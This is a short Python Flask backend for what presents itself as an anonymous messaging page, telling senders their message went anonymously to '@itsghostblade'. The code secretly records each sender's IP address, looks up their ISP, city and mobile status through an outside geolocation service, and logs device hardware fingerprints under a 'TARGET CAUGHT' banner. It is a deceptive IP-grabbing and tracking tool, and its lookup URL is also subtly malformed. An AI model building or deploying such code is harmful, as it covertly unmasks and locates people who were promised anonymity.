from flask import Flask, request, render_template_string
from flask_cors import CORS
import datetime
import requests

app = Flask(__name__)
# Allow CORS so your frontend can talk to the backend from different domains
CORS(app)

SUCCESS_PAGE = """
<div style="background: white; padding: 40px; border-radius: 35px; text-align: center; font-family: sans-serif;">
    <h1 style="color: #FE2F78;"> Message Sent !</h1>
    <p style="color: #666;">Your anonymous message has been delivered to @itsghostblade</p>
</div>
"""

@app.route('/')
def home():
    return "NGL Backend is ONLINE.", 200

@app.route('/submit', methods=['POST'])
def submit():
    try:
        # Support both standard Form and JSON (AJAX)
        data = request.form if request.form else request.get_json()
        
        msg = data.get('message', 'No Message')
        ua = request.headers.get('User-Agent', 'Unknown')
        dev_hash = data.get('device_hash', 'No-Hash')
        
        # IP Extraction
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        
        # ISP Lookup
        network_info = "Lookup Failed"
        try:
            res = requests.get(f"http://ip-api.com{ip}?fields=isp,city,mobile", timeout=3)
            d = res.json()
            network_info = f"{d.get('isp')} | {d.get('city')} (Mobile: {d.get('mobile')})"
        except:
            network_info = f"IP: {ip}"

        log_report = (
            f"\n{'#'*60}\n"
            f"🎯 TARGET CAUGHT: {datetime.datetime.now()}\n"
            f"💬 MSG: {msg}\n"
            f"🌐 NET: {network_info}\n"
            f"⚙️ HW:  GPU:{data.get('gpu')} | RAM:{data.get('ram')}GB | CPU:{data.get('cores')}\n"
            f"{'#'*60}\n"
        )
        print(log_report)
        return SUCCESS_PAGE, 200

    except Exception as e:
        print(f"ERROR: {e}")
        return "Error", 500

if __name__ == "__main__":
    app.run()
